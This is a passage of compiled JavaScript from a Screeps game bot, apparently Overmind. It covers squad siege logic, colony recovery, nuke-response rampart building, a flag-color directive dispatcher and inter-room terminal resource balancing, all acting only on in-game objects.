        if (!swarm.memory.initialAssembly) {
            const assemblyPoint = this.assemblyPoints[index] || this.fallback;
            log.debug(`Assmbling at ${assemblyPoint.print}`);
            swarm.memory.initialAssembly = swarm.assemble(assemblyPoint);
            return;
        }
        // Swarm has now initially assembled with all members present
        // log.debug(`Done assmbling`);
        const room = swarm.rooms[0];
        if (!room) {
            log.warning(`${this.print} No room! (Why?)`);
        }
        // Siege the room
        const nearbyHostiles = _.filter(room.hostiles, creep => swarm.minRangeTo(creep) <= 3 + 1);
        const attack = _.sum(nearbyHostiles, creep => CombatIntel.getAttackDamage(creep));
        const rangedAttack = _.sum(nearbyHostiles, creep => CombatIntel.getRangedAttackDamage(creep));
        const myDamageMultiplier = CombatIntel.minimumDamageMultiplierForGroup(_.map(swarm.creeps, c => c.creep));
        const canPopShield = (attack + rangedAttack + CombatIntel.towerDamageAtPos(swarm.anchor)) * myDamageMultiplier
            > _.min(_.map(swarm.creeps, creep => 100 * creep.getActiveBodyparts(TOUGH)));
        if (canPopShield || room.hostileStructures.length == 0 || _.values(this.swarms).length > 1) {
            swarm.autoCombat(this.pos.roomName, waypoint);
        }
        else {
            swarm.autoSiege(this.pos.roomName, waypoint);
        }
    }
    init() {
        let numSwarms = this.directive.memory.amount || 1;
        if (RoomIntel.inSafeMode(this.pos.roomName)) {
            numSwarms = 0;
        }
        const zerglingPriority = this.zerglings.length <= this.healers.length ? this.priority - 0.1 : this.priority + 0.1;
        const zerglingSetup = this.canBoostSetup(CombatSetups.zerglings.boosted_T3) ? CombatSetups.zerglings.boosted_T3
            : CombatSetups.zerglings.default;
        const healerPriority = this.healers.length < this.zerglings.length ? this.priority - 0.1 : this.priority + 0.1;
        const healerSetup = this.canBoostSetup(CombatSetups.healers.boosted_T3) ? CombatSetups.healers.boosted_T3
            : CombatSetups.healers.default;
        const hydraliskPriority = this.healers.length < this.zerglings.length ? this.priority - 0.1 : this.priority + 0.1;
        const hydraliskSetup = this.canBoostSetup(CombatSetups.hydralisks.siege_T3) ? CombatSetups.healers.boosted_T3
            : CombatSetups.healers.default;
        const swarmConfig = [{ setup: zerglingSetup, amount: 2, priority: zerglingPriority },
            { setup: healerSetup, amount: 2, priority: healerPriority }];
        this.swarmWishlist(numSwarms, swarmConfig);
        // const rangedSwarmConfig = [{setup: hydraliskSetup, amount: 4, priority: hydraliskPriority}];
        // this.swarmWishlist(numSwarms, rangedSwarmConfig);
    }
    run() {
        this.autoRun(this.zerglings, zergling => undefined); // zergling => undefined is to handle boosting
        this.autoRun(this.healers, healer => undefined);
        // this.autoRun(this.hydralisks, hydralisk => undefined);
        // Run swarms in order
        const refs = _.keys(this.swarms).sort();
        let i = 0;
        for (const ref of refs) {
            this.handleSwarm(this.swarms[ref], i);
            i++;
        }
    }
    visuals() {
        Visualizer.marker(this.fallback, { color: 'green' });
        for (const ref in this.swarms) {
            const swarm = this.swarms[ref];
            Visualizer.marker(swarm.anchor, { color: 'blue' });
            if (swarm.target) {
                Visualizer.marker(swarm.target.pos, { color: 'orange' });
            }
        }
    }
};
SwarmDestroyerOverlord.settings = {
    retreatHitsPercent: 0.85,
    reengageHitsPercent: 0.95,
};
SwarmDestroyerOverlord = __decorate([
    profile
], SwarmDestroyerOverlord);

/**
 * Spawns a 2x2 squad of coordinated creeps to destroy a room
 */
let DirectiveSwarmDestroy = class DirectiveSwarmDestroy extends Directive {
    constructor(flag) {
        super(flag);
    }
    spawnMoarOverlords() {
        this.overlords.destroy = new SwarmDestroyerOverlord(this);
    }
    init() {
        this.alert(`Swarm destroyer directive active`);
    }
    run() {
        // If there are no hostiles left in the room then remove the flag and associated healpoint
        if (this.room && this.room.hostiles.length == 0 && this.room.hostileStructures.length == 0) {
            log.notify(`Swarm destroyer mission at ${this.pos.roomName} completed successfully.`);
            this.remove();
        }
    }
    visuals() {
        Visualizer.marker(this.pos, { color: 'red' });
    }
};
DirectiveSwarmDestroy.directiveName = 'destroy';
DirectiveSwarmDestroy.color = COLOR_RED;
DirectiveSwarmDestroy.secondaryColor = COLOR_RED;
DirectiveSwarmDestroy = __decorate([
    profile
], DirectiveSwarmDestroy);

/**
 * Manually place a bunker anchored at the target location for the RoomPlanner to use in semiautomatic or manual mode
 */
let DirectiveRPBunker = class DirectiveRPBunker extends Directive {
    constructor(flag) {
        super(flag);
    }
    spawnMoarOverlords() {
    }
    init() {
        this.colony.roomPlanner.addComponent('bunker', this.pos, this.memory.rotation);
    }
    run() {
    }
    visuals() {
        Visualizer.drawLayout(bunkerLayout, this.pos);
    }
};
DirectiveRPBunker.directiveName = 'roomPlanner:CommandCenter';
DirectiveRPBunker.color = COLOR_WHITE;
DirectiveRPBunker.secondaryColor = COLOR_RED;
DirectiveRPBunker = __decorate([
    profile
], DirectiveRPBunker);

/**
 * [DEPRECATED] Place a command center at the target location
 */
let DirectiveRPCommandCenter = class DirectiveRPCommandCenter extends Directive {
    constructor(flag) {
        super(flag);
    }
    spawnMoarOverlords() {
    }
    init() {
        log.info(`Classic overmind layout is deprecated; bunker layout is recommended.`);
        this.colony.roomPlanner.addComponent('commandCenter', this.pos, this.memory.rotation);
    }
    run() {
    }
};
DirectiveRPCommandCenter.directiveName = 'roomPlanner:CommandCenter';
DirectiveRPCommandCenter.color = COLOR_WHITE;
DirectiveRPCommandCenter.secondaryColor = COLOR_BLUE;
DirectiveRPCommandCenter = __decorate([
    profile
], DirectiveRPCommandCenter);

/**
 * [DEPRECATED] Place a hatchery at the target location
 */
let DirectiveRPHatchery = class DirectiveRPHatchery extends Directive {
    constructor(flag) {
        super(flag);
    }
    spawnMoarOverlords() {
    }
    init() {
        log.info(`Classic overmind layout is deprecated; bunker layout is recommended.`);
        this.colony.roomPlanner.addComponent('hatchery', this.pos, this.memory.rotation);
    }
    run() {
    }
};
DirectiveRPHatchery.directiveName = 'roomPlanner:Hatchery';
DirectiveRPHatchery.color = COLOR_WHITE;
DirectiveRPHatchery.secondaryColor = COLOR_GREEN;
DirectiveRPHatchery = __decorate([
    profile
], DirectiveRPHatchery);

var BootstrappingOverlord_1;
/**
 * Bootstrapping overlord: spawns small miners and suppliers to recover from a catastrohpic colony crash
 */
let BootstrappingOverlord = BootstrappingOverlord_1 = class BootstrappingOverlord extends Overlord {
    constructor(directive, priority = OverlordPriority.emergency.bootstrap) {
        super(directive, 'bootstrap', priority);
        this.fillers = this.zerg(Roles.filler);
        // Calculate structures fillers can supply / withdraw from
        this.supplyStructures = _.filter([...this.colony.spawns, ...this.colony.extensions], structure => structure.energy < structure.energyCapacity);
        this.withdrawStructures = _.filter(_.compact([this.colony.storage,
            this.colony.terminal,
            this.colony.powerSpawn,
            ...this.room.containers,
            ...this.room.links,
            ...this.room.towers,
            ...this.room.labs]), structure => structure.energy > 0);
    }
    spawnBootstrapMiners() {
        // Isolate mining site overlords in the room
        let miningSites = _.filter(_.values(this.colony.miningSites), (site) => site.room == this.colony.room);
        if (this.colony.spawns[0]) {
            miningSites = _.sortBy(miningSites, site => site.pos.getRangeTo(this.colony.spawns[0]));
        }
        const miningOverlords = _.map(miningSites, site => site.overlords.mine);
        // Create a bootstrapMiners and donate them to the miningSite overlords as needed
        for (const overlord of miningOverlords) {
            const filteredMiners = this.lifetimeFilter(overlord.miners);
            const miningPowerAssigned = _.sum(_.map(this.lifetimeFilter(overlord.miners), creep => creep.getActiveBodyparts(WORK)));
            if (miningPowerAssigned < overlord.miningPowerNeeded &&
                filteredMiners.length < overlord.pos.availableNeighbors().length) {
                if (this.colony.hatchery) {
                    const request = {
                        setup: Setups.drones.miners.emergency,
                        overlord: overlord,
                        priority: this.priority + 1,
                    };
                    this.colony.hatchery.enqueue(request);
                }
            }
        }
    }
    init() {
        // At early levels, spawn one miner, then a filler, then the rest of the miners
        if (this.colony.stage == ColonyStage.Larva) {
            if (this.colony.getCreepsByRole(Roles.drone).length == 0) {
                this.spawnBootstrapMiners();
                return;
            }
        }
        // Spawn fillers
        if (this.colony.getCreepsByRole(Roles.queen).length == 0 && this.colony.hatchery) { // no queen
            const transporter = _.first(this.colony.getZergByRole(Roles.transport));
            if (transporter) {
                // reassign transporter to be queen
                transporter.reassign(this.colony.hatchery.overlord, Roles.queen);
            }
            else {
                // wish for a filler
                this.wishlist(1, Setups.filler);
            }
        }
        // Then spawn the rest of the needed miners
        const energyInStructures = _.sum(_.map(this.withdrawStructures, structure => structure.energy));
        const droppedEnergy = _.sum(this.room.droppedEnergy, drop => drop.amount);
        if (energyInStructures + droppedEnergy < BootstrappingOverlord_1.settings.spawnBootstrapMinerThreshold) {
            this.spawnBootstrapMiners();
        }
    }
    supplyActions(filler) {
        const target = filler.pos.findClosestByRange(this.supplyStructures);
        if (target) {
            filler.task = Tasks.transfer(target);
        }
        else {
            this.rechargeActions(filler);
        }
    }
    rechargeActions(filler) {
        const target = filler.pos.findClosestByRange(this.withdrawStructures);
        if (target) {
            filler.task = Tasks.withdraw(target);
        }
        else {
            filler.task = Tasks.recharge();
        }
    }
    handleFiller(filler) {
        if (filler.carry.energy > 0) {
            this.supplyActions(filler);
        }
        else {
            this.rechargeActions(filler);
        }
    }
    run() {
        for (const filler of this.fillers) {
            if (filler.isIdle) {
                this.handleFiller(filler);
            }
            filler.run();
        }
    }
};
BootstrappingOverlord.settings = {
    spawnBootstrapMinerThreshold: 2500
};
BootstrappingOverlord = BootstrappingOverlord_1 = __decorate([
    profile
], BootstrappingOverlord);

/**
 * Bootstrapping directive: recover from a colony-wide crash or bootstrap from initial spawn-in
 */
let DirectiveBootstrap = class DirectiveBootstrap extends Directive {
    constructor(flag) {
        super(flag);
        this.refresh(); // data needs to be recomputed each tick
    }
    refresh() {
        super.refresh();
        this.colony.bootstrapping = true;
        this.needsMiner = (this.colony.getCreepsByRole(Roles.drone).length == 0);
        this.needsManager = (this.colony.commandCenter != undefined &&
            this.colony.commandCenter.overlord != undefined &&
            this.colony.getCreepsByRole(Roles.manager).length == 0);
        this.needsQueen = (this.colony.getCreepsByRole(Roles.queen).length == 0);
    }
    spawnMoarOverlords() {
        this.overlords.bootstrap = new BootstrappingOverlord(this);
    }
    init() {
        this.alert(`Colony in bootstrap mode!`, NotifierPriority.High);
        if (Game.time % 100 == 0) {
            log.alert(`Colony ${this.room.print} is in emergency recovery mode.`);
        }
    }
    run() {
        if (!this.needsQueen && !this.needsMiner && !this.needsManager) {
            log.alert(`Colony ${this.room.print} has recovered from crash; removing bootstrap directive.`);
            // Suicide any fillers so they don't get in the way
            const overlord = this.overlords.bootstrap;
            for (const filler of overlord.fillers) {
                filler.suicide();
            }
            // Remove the directive
            this.remove();
        }
    }
};
DirectiveBootstrap.directiveName = 'bootstrap';
DirectiveBootstrap.color = COLOR_ORANGE;
DirectiveBootstrap.secondaryColor = COLOR_ORANGE;
DirectiveBootstrap = __decorate([
    profile
], DirectiveBootstrap);

var DirectiveNukeResponse_1;
/**
 * Nuke response: automatically over-fortify ramparts to withstand an incoming nuclear strike
 */
let DirectiveNukeResponse = DirectiveNukeResponse_1 = class DirectiveNukeResponse extends Directive {
    constructor(flag) {
        super(flag, colony => colony.name == Directive.getPos(flag).roomName
            && colony.level >= DirectiveNukeResponse_1.requiredRCL);
        this.refresh();
    }
    refresh() {
        super.refresh();
        this.nuke = this.pos.lookFor(LOOK_NUKES)[0]; // TODO: needs to handle multiple nukes on same pos
    }
    spawnMoarOverlords() {
    }
    init() {
        if (this.nuke) {
            this.alert(`Nuclear impact in ${this.nuke.timeToLand}`, NotifierPriority.Critical);
        }
        else {
            this.alert(`Nuke response directive active!`, NotifierPriority.Critical);
        }
    }
    run() {
        // Build ramparts at all positions affected by nukes with structures on them
        if (Game.time % 50 == 0) {
            if (this.nuke) {
                const rampartPositions = _.filter(this.nuke.pos.getPositionsInRange(2), function (pos) {
                    // Rampart should be built to protect all non-road, non-barrier structures in nuke range
                    return _.filter(pos.lookFor(LOOK_STRUCTURES), s => s.structureType != STRUCTURE_ROAD &&
                        s.structureType != STRUCTURE_RAMPART &&
                        s.structureType != STRUCTURE_WALL).length > 0;
                });
                for (const pos of rampartPositions) {
                    // Build a rampart if there isn't one already
                    if (!pos.lookForStructure(STRUCTURE_RAMPART)) {
                        pos.createConstructionSite(STRUCTURE_RAMPART);
                    }
                }
                log.alert(`Incoming nuke at ${this.nuke.pos.print}! Time until impact: ${this.nuke.timeToLand}`);
            }
            else {
                // Remove once nuke is gone
                this.remove();
            }
        }
    }
};
DirectiveNukeResponse.directiveName = 'nukeResponse';
DirectiveNukeResponse.color = COLOR_ORANGE;
DirectiveNukeResponse.secondaryColor = COLOR_BLUE;
DirectiveNukeResponse.requiredRCL = 4;
DirectiveNukeResponse = DirectiveNukeResponse_1 = __decorate([
    profile
], DirectiveNukeResponse);

/**
 * Register a target to be dismantled by workers. This is not a siege directive, and clearing rooms should
 * be done with the DirectiveRoomClear
 */
let DirectiveDismantle = class DirectiveDismantle extends Directive {
    constructor(flag) {
        super(flag);
    }
    spawnMoarOverlords() {
    }
    getTarget() {
        if (!this.pos.isVisible) {
            return;
        }
        const targetedStructures = this.pos.lookFor(LOOK_STRUCTURES);
        for (const structure of targetedStructures) {
            for (const structureType of AttackStructurePriorities) {
                if (structure.structureType == structureType) {
                    return structure;
                }
            }
        }
    }
    init() {
        // Add this structure to worker overlord's dismantle list
        const target = this.getTarget();
        if (target && !this.colony.overlords.work.dismantleStructures.includes(target)) {
            this.colony.overlords.work.dismantleStructures.push(target);
        }
    }
    run() {
        // Remove the directive once structures have been destroyed
        if (this.pos.isVisible && !this.getTarget()) {
            this.remove();
        }
    }
    visuals() {
        Visualizer.marker(this.pos, { color: 'yellow' });
    }
};
DirectiveDismantle.directiveName = 'dismantle';
DirectiveDismantle.color = COLOR_GREY;
DirectiveDismantle.secondaryColor = COLOR_YELLOW;
DirectiveDismantle = __decorate([
    profile
], DirectiveDismantle);

const TERMINAL_STATE_EMERGENCY = {
    name: 'emergency',
    type: 'in',
    amounts: {
        [RESOURCE_ENERGY]: 25000,
        [RESOURCE_CATALYZED_GHODIUM_ALKALIDE]: 3000,
        [RESOURCE_CATALYZED_ZYNTHIUM_ACID]: 3000,
        [RESOURCE_CATALYZED_ZYNTHIUM_ALKALIDE]: 3000,
        [RESOURCE_CATALYZED_LEMERGIUM_ALKALIDE]: 3000,
        [RESOURCE_CATALYZED_LEMERGIUM_ACID]: 3000,
        [RESOURCE_CATALYZED_KEANIUM_ALKALIDE]: 3000,
        [RESOURCE_CATALYZED_UTRIUM_ACID]: 3000,
    },
    tolerance: 500
};
const EMERGENCY_STATE_TIMEOUT = 10000;
/**
 * Put the colony's terminal in an emergency state, which maintains supplies of T3 boots during defensive operations
 */
let DirectiveTerminalEmergencyState = class DirectiveTerminalEmergencyState extends Directive {
    constructor(flag) {
        super(flag);
        this.refresh();
    }
    refresh() {
        super.refresh();
        // Register abandon status
        this.terminal = this.pos.lookForStructure(STRUCTURE_TERMINAL);
        if (this.terminal) {
            Overmind.terminalNetwork.registerTerminalState(this.terminal, TERMINAL_STATE_EMERGENCY);
        }
        if (Game.time % 25 == 0) {
            log.alert(`${this.pos.print}: emergency terminal state active!`, NotifierPriority.High);
        }
    }
    spawnMoarOverlords() {
    }
    init() {
        this.alert('Emergency terminal state active!');
    }
    run() {
        // Incubation directive gets removed once the colony has a command center (storage)
        if (!this.colony || !this.terminal || Game.time > (this.memory["T" /* TICK */] || 0) + EMERGENCY_STATE_TIMEOUT) {
            this.remove();
        }
    }
};
DirectiveTerminalEmergencyState.directiveName = 'emergencyState';
DirectiveTerminalEmergencyState.color = COLOR_BROWN;
DirectiveTerminalEmergencyState.secondaryColor = COLOR_ORANGE;
DirectiveTerminalEmergencyState = __decorate([
    profile
], DirectiveTerminalEmergencyState);

const TERMINAL_STATE_EVACUATE = {
    name: 'evacuate',
    type: 'out',
    amounts: {},
    tolerance: 500
};
const EVACUATE_STATE_TIMEOUT = 25000;
/**
 * Put the colony's terminal in an evacuation state, which pushes resources out of a room which is about to be breached
 */
let DirectiveTerminalEvacuateState = class DirectiveTerminalEvacuateState extends Directive {
    constructor(flag) {
        super(flag);
        this.refresh();
    }
    refresh() {
        super.refresh();
        // Register abandon status
        this.terminal = this.pos.lookForStructure(STRUCTURE_TERMINAL);
        if (this.terminal) {
            Overmind.terminalNetwork.registerTerminalState(this.terminal, TERMINAL_STATE_EVACUATE);
        }
        if (Game.time % 25 == 0) {
            log.alert(`${this.pos.print}: evacuation terminal state active!`);
        }
    }
    spawnMoarOverlords() {
    }
    init() {
        this.alert('Evacuation terminal state active!', NotifierPriority.High);
    }
    run() {
        // Incubation directive gets removed once the colony has a command center (storage)
        if (!this.colony || !this.terminal || Game.time > (this.memory["T" /* TICK */] || 0) + EVACUATE_STATE_TIMEOUT) {
            this.remove();
        }
    }
};
DirectiveTerminalEvacuateState.directiveName = 'evacuateState';
DirectiveTerminalEvacuateState.color = COLOR_BROWN;
DirectiveTerminalEvacuateState.secondaryColor = COLOR_RED;
DirectiveTerminalEvacuateState = __decorate([
    profile
], DirectiveTerminalEvacuateState);

// Jump table to instantiate flags based on type
/**
 * This is the initializer for directives, which maps flags by their color code to the corresponding directive
 */
function DirectiveWrapper(flag) {
    switch (flag.color) {
        // Colony directives ===========================================================================================
        case COLOR_PURPLE:
            switch (flag.secondaryColor) {
                case COLOR_PURPLE:
                    return new DirectiveOutpost(flag);
                case COLOR_YELLOW:
                    return new DirectiveSKOutpost(flag);
                case COLOR_WHITE:
                    return new DirectiveIncubate(flag);
                case COLOR_GREY:
                    return new DirectiveColonize(flag);
                case COLOR_ORANGE:
                    return new DirectiveClearRoom(flag);
            }
            break;
        // Offensive combat directives =================================================================================
        case COLOR_RED:
            switch (flag.secondaryColor) {
                case COLOR_RED:
                    return new DirectiveSwarmDestroy(flag);
                case COLOR_CYAN:
                    return new DirectivePairDestroy(flag);
                case COLOR_PURPLE:
                    return new DirectiveControllerAttack(flag);
            }
            break;
        // Defensive combat directives =================================================================================
        case COLOR_BLUE:
            switch (flag.secondaryColor) {
                case COLOR_BLUE:
                    return new DirectiveGuard(flag);
                case COLOR_RED:
                    return new DirectiveOutpostDefense(flag);
                case COLOR_PURPLE:
                    return new DirectiveInvasionDefense(flag);
            }
            break;
        // Situational directives ======================================================================================
        case COLOR_ORANGE:
            switch (flag.secondaryColor) {
                case COLOR_ORANGE:
                    return new DirectiveBootstrap(flag);
                case COLOR_BLUE:
                    return new DirectiveNukeResponse(flag);
            }
            break;
        // Resource directives =========================================================================================
        case COLOR_YELLOW:
            switch (flag.secondaryColor) {
                case COLOR_YELLOW:
                    return new DirectiveHarvest(flag);
                case COLOR_CYAN:
                    return new DirectiveExtract(flag);
                case COLOR_BLUE:
                    return new DirectiveHaul(flag);
            }
            break;
        // Terminal state directives ===================================================================================
        case COLOR_BROWN:
            switch (flag.secondaryColor) {
                case COLOR_RED:
                    return new DirectiveTerminalEvacuateState(flag);
                case COLOR_ORANGE:
                    return new DirectiveTerminalEmergencyState(flag);
                case COLOR_YELLOW:
                    return new DirectiveTerminalRebuildState(flag);
            }
            break;
        // Targeting colors ============================================================================================
        case COLOR_GREY:
            switch (flag.secondaryColor) {
                case COLOR_ORANGE:
                    return new DirectiveTargetSiege(flag);
                case COLOR_YELLOW:
                    return new DirectiveDismantle(flag);
            }
            break;
        // Room planning directives ====================================================================================
        case COLOR_WHITE:
            switch (flag.secondaryColor) {
                case COLOR_GREEN:
                    return new DirectiveRPHatchery(flag);
                case COLOR_BLUE:
                    return new DirectiveRPCommandCenter(flag);
                case COLOR_RED:
                    return new DirectiveRPBunker(flag);
            }
            break;
    }
}

var TerminalNetwork_1;
const TerminalNetworkMemoryDefaults = {
    equalizeIndex: 0
};
const TerminalNetworkStatsDefaults = {
    transfers: {
        costs: {},
    },
};
function colonyOf(terminal) {
    return Overmind.colonies[terminal.room.name];
}
function wantedAmount(colony, resource) {
    return Abathur.stockAmount(resource) - (colony.assets[resource] || 0);
}
/**
 * The terminal network controls inter-colony resource transfers and requests, equalizing resources between rooms and
 * responding to on-demand resource requests
 */
let TerminalNetwork = TerminalNetwork_1 = class TerminalNetwork {
    constructor(terminals) {
        this.allTerminals = terminals;
        this.terminals = _.clone(terminals);
        this.readyTerminals = _.filter(terminals, t => t.cooldown == 0);
        this.memory = Mem.wrap(Memory.Overmind, 'terminalNetwork', TerminalNetworkMemoryDefaults);
        this.stats = Mem.wrap(Memory.stats.persistent, 'terminalNetwork', TerminalNetworkStatsDefaults, true);
        this.alreadyReceived = [];
        this.alreadySent = [];
        this.exceptionTerminals = {}; // populated in init()
        this.assets = {}; // populated in init()
        this.notifications = [];
        this.averageFullness = _.sum(this.terminals, t => _.sum(t.store) / t.storeCapacity) / this.terminals.length;
    }
    refresh() {
        $.refresh(this, 'allTerminals');
        this.terminals = _.clone(this.allTerminals);
        this.readyTerminals = _.filter(this.terminals, t => t.cooldown == 0);
        this.memory = Mem.wrap(Memory.Overmind, 'terminalNetwork', TerminalNetworkMemoryDefaults);
        this.stats = Mem.wrap(Memory.stats.persistent, 'terminalNetwork', TerminalNetworkStatsDefaults);
        this.alreadyReceived = [];
        this.alreadySent = [];
        this.exceptionTerminals = {}; // populated in init()
        this.assets = {}; // populated in init()
        this.notifications = [];
        this.averageFullness = _.sum(this.terminals, t => _.sum(t.store) / t.storeCapacity) / this.terminals.length;
    }
    /* Summarizes the total of all resources currently in a colony store structure */
    getAllAssets() {
        return mergeSum(_.map(this.terminals, terminal => colonyOf(terminal).assets));
    }
    logTransfer(resourceType, amount, origin, destination) {
        if (!this.stats.transfers[resourceType])
            this.stats.transfers[resourceType] = {};
        if (!this.stats.transfers[resourceType][origin])
            this.stats.transfers[resourceType][origin] = {};
        if (!this.stats.transfers[resourceType][origin][destination]) {
            this.stats.transfers[resourceType][origin][destination] = 0;
        }
        this.stats.transfers[resourceType][origin][destination] += amount;
        this.logTransferCosts(amount, origin, destination);
    }
    logTransferCosts(amount, origin, destination) {
        if (!this.stats.transfers.costs[origin])
            this.stats.transfers.costs[origin] = {};
        if (!this.stats.transfers.costs[origin][destination])
            this.stats.transfers.costs[origin][destination] = 0;
        const transactionCost = Game.market.calcTransactionCost(amount, origin, destination);
        this.stats.transfers.costs[origin][destination] += transactionCost;
    }
    notify(msg) {
        this.notifications.push(bullet + msg);
    }
    /**
     * Whether the terminal is actively requesting energy
     */
    terminalNeedsEnergy(terminal) {
        return terminal.energy < Energetics.settings.terminal.energy.inThreshold;
    }
    /**
     * Amount of space available in storage and terminal
     */
    remainingRoomCapacity(room) {
        let remainingCapacity = 0;
        if (room.storage) {
            remainingCapacity += room.storage.storeCapacity - _.sum(room.storage.store);
        }
        if (room.terminal) {
            remainingCapacity += room.terminal.storeCapacity - _.sum(room.terminal.store);
        }
        return remainingCapacity;
    }
    /**
     * Amount of energy in storage and terminal
     */
    energyInRoom(room) {
        let energyInRoom = 0;
        if (room.storage) {
            energyInRoom += room.storage.energy;
        }
        if (room.terminal) {
            energyInRoom += room.terminal.energy;
        }
        return energyInRoom;
    }
    /**
     * Transfer resources from one terminal to another, logging the results
     */
    transfer(sender, receiver, resourceType, amount, description) {
        const cost = Game.market.calcTransactionCost(amount, sender.room.name, receiver.room.name);
        const response = sender.send(resourceType, amount, receiver.room.name);
        if (response == OK) {
            let msg = `${sender.room.print} ${rightArrow} ${amount} ${resourceType} ${rightArrow} ` +
                `${receiver.room.print} `;
            if (description) {
                msg += `(for ${description})`;
            }
            this.notify(msg);
            // log.info(`Sent ${amount} ${resourceType} from ${sender.room.print} to ` +
            //       `${receiver.room.print}. Fee: ${cost}.`);
            this.logTransfer(resourceType, amount, sender.room.name, receiver.room.name);
            this.alreadySent.push(sender);
            this.alreadyReceived.push(receiver);
            _.remove(this.readyTerminals, terminal => terminal.id == sender.id);
        }
        else {
            log.warning(`Could not send ${amount} ${resourceType} from ${sender.room.print} to ` +
                `${receiver.room.print}! Response: ${response}`);
        }
        return response;
    }
    /**
     * Request resources from the terminal network, purchasing from market if unavailable and allowable
     */
    requestResource(receiver, resourceType, amount, allowBuy = true, minDifference = 4000) {
        if (this.exceptionTerminals[receiver.ref]) {
            return; // don't send to abandoning terminals
        }
        amount = Math.max(amount, TERMINAL_MIN_SEND);
        const possibleSenders = _.filter(this.terminals, terminal => (terminal.store[resourceType] || 0) > amount + minDifference &&
            terminal.cooldown == 0 && !this.alreadySent.includes(terminal) &&
            terminal.id != receiver.id);
        const sender = maxBy(possibleSenders, t => (t.store[resourceType] || 0));
        if (sender) {
            this.transfer(sender, receiver, resourceType, amount, 'resource request');
        }
        else if (allowBuy) {
            Overmind.tradeNetwork.buy(receiver, resourceType, amount);
        }
    }
    /**
     * Sell excess minerals on the market
     */
    handleExcess(terminal, threshold = 25000) {
        const terminalNearCapacity = _.sum(terminal.store) > 0.95 * terminal.storeCapacity;
        for (const resource in terminal.store) {
            if (resource == RESOURCE_POWER) {
                continue;
            }
            if (resource == RESOURCE_ENERGY) {
                let energyThreshold = Energetics.settings.terminal.energy.outThreshold;
                if (terminalNearCapacity) { // if you're close to full, be more agressive with selling energy
                    energyThreshold = Energetics.settings.terminal.energy.equilibrium
                        + Energetics.settings.terminal.energy.tolerance;
                }
                const amount = Energetics.settings.terminal.energy.tradeAmount;
                if (terminal.store[RESOURCE_ENERGY] > energyThreshold) {
                    // don't do anything if you have storage that is below energy cap and energy can be moved there
                    const storage = colonyOf(terminal).storage;
                    const storageEnergyCap = Energetics.settings.storage.total.cap;
                    if (!storage || storage.energy >= storageEnergyCap) {
                        if (terminalNearCapacity) { // just get rid of stuff at high capacities
                            const response = Overmind.tradeNetwork.sellDirectly(terminal, RESOURCE_ENERGY, amount, true);
                            if (response == OK)
                                return;
                        }
                        else {
                            const response = Overmind.tradeNetwork.sell(terminal, RESOURCE_ENERGY, amount, MAX_ENERGY_SELL_ORDERS);
                            if (response == OK)
                                return;
                        }
                    }
                }
            }
            else {
                if (terminal.store[resource] > threshold) {
                    const receiver = maxBy(this.terminals, terminal => wantedAmount(colonyOf(terminal), resource));
                    if (receiver && wantedAmount(colonyOf(receiver), resource) > TERMINAL_MIN_SEND) {
                        // Try to send internally first
                        const response = this.transfer(terminal, receiver, resource, 1000, 'excess resources');
                        if (response == OK)
                            return;
                    }
                    else {
                        // Sell excess
                        if (terminalNearCapacity || terminal.store[resource] > 2 * threshold) {
                            const response = Overmind.tradeNetwork.sellDirectly(terminal, resource, 1000);
                            if (response == OK)
                                return;
                        }
                        else {
                            const response = Overmind.tradeNetwork.sell(terminal, resource, 10000);
                            if (response == OK)
                                return;
                        }
                    }
                }
            }
        }
    }
    // private sendExcessEnergy(terminal: StructureTerminal): void {
    //  let {sendSize, inThreshold, outThreshold, equilibrium} = Energetics.settings.terminal.energy;
    //  // See if there are any rooms actively needing energy first
    //  let needyTerminals = _.filter(this.terminals, t =>
    //      t != terminal && this.terminalNeedsEnergy(t) && !this.alreadyReceived.includes(t));
    //  if (needyTerminals.length > 0) {
    //      // Send to the most cost-efficient needy terminal
    //      let bestTerminal = minBy(needyTerminals, (receiver: StructureTerminal) =>
    //          Game.market.calcTransactionCost(sendSize, terminal.room.name, receiver.room.name));
    //      if (bestTerminal) this.transferEnergy(terminal, bestTerminal);
    //  } else {
    //      // Send to the terminal with least energy that is not already trying to get rid of stuff
    //      let okTerminals = _.filter(this.terminals, t =>
    //          t != terminal && t.store.energy < outThreshold - sendSize && !this.alreadyReceived.includes(t));
    //      let bestTerminal = minBy(okTerminals, (receiver: StructureTerminal) => this.energyInRoom(receiver.room));
    //      if (bestTerminal) this.transferEnergy(terminal, bestTerminal);
    //  }
    // }
    /**
     * Equalize resource amounts of each type through all non-exceptional terminals in the network
     */
    equalize(resourceType, terminals = this.terminals, verbose = false) {
        log.debug(`Equalizing ${resourceType} within terminal network`);
        const maxSendSize = resourceType == RESOURCE_ENERGY ? TerminalNetwork_1.settings.equalize.maxEnergySendSize
            : TerminalNetwork_1.settings.equalize.maxMineralSendSize;
        const averageAmount = _.sum(_.map(terminals, terminal => (colonyOf(terminal).assets[resourceType] || 0))) / terminals.length;
        const terminalsByResource = _.sortBy(terminals, terminal => (colonyOf(terminal).assets[resourceType] || 0));
        if (verbose)
            log.debug(_.map(terminalsByResource, t => `${t.room.name}: ${colonyOf(t).assets[resourceType]}`));
        // Min-max match terminals
        const receivers = _.take(terminalsByResource, Math.floor(terminalsByResource.length / 2));
        terminalsByResource.reverse();
        const senders = _.take(terminalsByResource, Math.floor(terminalsByResource.length / 2));
        if (verbose)
            log.debug(`Receivers: ${_.map(receivers, t => t.room.print)}`);
        if (verbose)
            log.debug(`Senders:   ${_.map(senders, t => t.room.print)}`);
        for (const [sender, receiver] of _.zip(senders, receivers)) {
            if (verbose)
                log.debug(` > ${sender.room.print} to ${receiver.room.print}...`);
            const senderAmount = colonyOf(sender).assets[resourceType] || 0;
            const receiverAmount = colonyOf(receiver).assets[resourceType] || 0;
            const tolerance = TerminalNetwork_1.settings.equalize.tolerance[resourceType]
                || TerminalNetwork_1.settings.equalize.tolerance.default;
            if (verbose) {
                log.debug(`    sender amt: ${senderAmount}  receiver amt: ${receiverAmount}  tolerance: ${tolerance}`);
            }
            if (senderAmount - receiverAmount < tolerance
                && receiverAmount > Energetics.settings.terminal.energy.inThreshold) {
                if (verbose)
                    log.debug(`   Low tolerance`);
                continue; // skip if colonies are close to equilibrium
            }
            const senderSurplus = senderAmount - averageAmount;
            const receiverDeficit = averageAmount - receiverAmount;
            let sendAmount = Math.min(senderSurplus, receiverDeficit, maxSendSize);
            sendAmount = Math.floor(Math.max(sendAmount, 0));
            const sendCost = Game.market.calcTransactionCost(sendAmount, sender.room.name, receiver.room.name);
